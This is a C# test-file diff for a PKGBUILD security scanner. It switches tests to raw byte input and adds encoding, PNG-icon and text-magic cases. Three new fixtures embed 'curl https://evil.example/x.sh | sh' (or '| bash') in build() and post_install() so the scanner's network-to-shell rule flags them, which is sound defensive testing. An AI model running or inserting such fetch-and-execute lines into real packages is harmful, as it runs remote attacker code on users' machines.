@@ -130,6 +130,11 @@ public class PkgBuildSecurityScannerTests
 
     private static ScanResult Scan(params (string Path, string Content)[] files)
     {
+        return ScanFiles([.. files.Select(f => (f.Path, Encoding.UTF8.GetBytes(f.Content)))]);
+    }
+
+    private static ScanResult ScanFiles(params (string Path, byte[] Content)[] files)
+    {
         return CreateScanner().Scan(files.ToDictionary(f => f.Path, f => f.Content, StringComparer.Ordinal));
     }
 
@@ -553,16 +558,14 @@ public class PkgBuildSecurityScannerTests
     [Fact]
     public void Scan_LocalElfAndBinaryData_SeparatesCriticalFromMedium()
     {
-        // Repository files reach the scanner as UTF-8-decoded strings, so decode
-        // real on-disk bytes instead of relying on string escapes. This mirrors
-        // how PackageService / AurMirror hand content to the scanner.
-        var elf = Encoding.UTF8.GetString([0x7F, 0x45, 0x4C, 0x46, .. Encoding.UTF8.GetBytes("payload")]);
-        var binary = "abc\0def";
+        // The scanner receives the stored raw bytes, so magic detection runs on the real
+        // on-disk content rather than a UTF-8-decoded string.
+        byte[] elf = [0x7F, 0x45, 0x4C, 0x46, .. Encoding.UTF8.GetBytes("payload")];
 
-        var result = Scan(
+        var result = ScanFiles(
             ("tool", elf),
-            ("data.bin", binary),
-            ("script.sh", "#!/bin/sh\necho ok\n"));
+            ("data.bin", Encoding.UTF8.GetBytes("abc\0def")),
+            ("script.sh", Encoding.UTF8.GetBytes("#!/bin/sh\necho ok\n")));
 
         var findings = result.Findings.Where(f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal)).ToList();
         Assert.Equal(2, findings.Count);
@@ -581,13 +584,99 @@ public class PkgBuildSecurityScannerTests
         // A lone continuation byte (0x80) is not valid UTF-8 and decodes to the
         // replacement character (U+FFFD). With no NUL or control characters present the
         // file is treated as text in an unrecognized encoding: retained, non-blocking.
-        var invalid = Encoding.UTF8.GetString([0x41, 0x80, 0x42]);
+        byte[] invalid = [0x41, 0x80, 0x42];
 
-        var result = Scan(("blob", invalid));
+        var result = ScanFiles(("blob", invalid));
 
         var finding = result.Findings.Single(f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal));
         Assert.Equal(FindingSeverity.Medium, finding.Severity);
         Assert.Contains("unrecognized encoding", finding.Message, StringComparison.Ordinal);
+        Assert.Equal(SecurityStatus.Verified, result.Status);
+    }
+
+    [Fact]
+    public void Scan_Utf16PkgBuildWithBom_StillPatternScanned()
+    {
+        // The old mirror path decoded BOM-marked UTF-16 before scanning; the scan-only view
+        // preserves that coverage. A BOM-less UTF-16 file remains undetectable.
+        var files = new Dictionary<string, byte[]>(StringComparer.Ordinal)
+        {
+            ["PKGBUILD"] =
+            [
+                .. Encoding.Unicode.GetPreamble(),
+                .. Encoding.Unicode.GetBytes("pkgname=foo\nbuild() {\n  curl https://evil.example/x.sh | sh\n}\n")
+            ]
+        };
+
+        var result = CreateScanner().Scan(files);
+
+        Assert.Contains(result.Findings, f => string.Equals(f.RuleId, "network-to-shell", StringComparison.Ordinal));
+        Assert.Equal(SecurityStatus.Flagged, result.Status);
+    }
+
+    [Fact]
+    public void Scan_Utf32PkgBuildWithBom_StillPatternScanned()
+    {
+        // StreamReader's BOM detection also covers UTF-32; the scan-only view keeps that
+        // coverage for the corpus's legacy-encoded PKGBUILDs.
+        var files = new Dictionary<string, byte[]>(StringComparer.Ordinal)
+        {
+            ["PKGBUILD"] =
+            [
+                .. Encoding.UTF32.GetPreamble(),
+                .. Encoding.UTF32.GetBytes("pkgname=foo\nbuild() {\n  curl https://evil.example/x.sh | sh\n}\n")
+            ]
+        };
+
+        var result = CreateScanner().Scan(files);
+
+        Assert.Contains(result.Findings, f => string.Equals(f.RuleId, "network-to-shell", StringComparison.Ordinal));
+        Assert.Equal(SecurityStatus.Flagged, result.Status);
+    }
+
+    [Fact]
+    public void Scan_Latin1InstallScriptlet_StillPatternScanned()
+    {
+        // Invalid UTF-8 still scans through the replacement fallback: the comment byte is
+        // undecodable, but the scriptlet lines stay reviewable.
+        var files = new Dictionary<string, byte[]>(StringComparer.Ordinal)
+        {
+            ["foo.install"] = Encoding.Latin1.GetBytes(
+                "# caf\u00e9\npost_install() {\n  curl https://evil.example/x.sh | bash\n}\n")
+        };
+
+        var result = CreateScanner().Scan(files);
+
+        Assert.Contains(result.Findings, f => string.Equals(f.RuleId, "network-to-shell", StringComparison.Ordinal));
+        Assert.Equal(SecurityStatus.Flagged, result.Status);
+    }
+
+    [Fact]
+    public void Scan_RawPngIcon_RetainedMediumVerified()
+    {
+        // burpsuite regression: the real PNG signature is binary, and inert media stays
+        // non-blocking once the scanner sees the upstream bytes.
+        byte[] png = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, .. new byte[16]];
+
+        var result = ScanFiles(
+            ("icon64.png", png),
+            ("PKGBUILD", Encoding.UTF8.GetBytes("pkgname=burpsuite\n")));
+
+        var finding = result.Findings.Single(f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal));
+        Assert.Equal(FindingSeverity.Medium, finding.Severity);
+        Assert.Equal(SecurityStatus.Verified, result.Status);
+    }
+
+    [Fact]
+    public void Scan_ValidTextWithMediaMagic_NotBinary()
+    {
+        // The binary gate runs on the text view first: ASCII magic in an ordinary note
+        // must not classify the file as inert media.
+        var result = Scan(
+            ("notes.txt", "GIF89a and %PDF are words in this note\n"),
+            ("PKGBUILD", "pkgname=foo\n"));
+
+        Assert.DoesNotContain(result.Findings, f => string.Equals(f.RuleId, "local-binary", StringComparison.Ordinal));
         Assert.Equal(SecurityStatus.Verified, result.Status);
     }
 
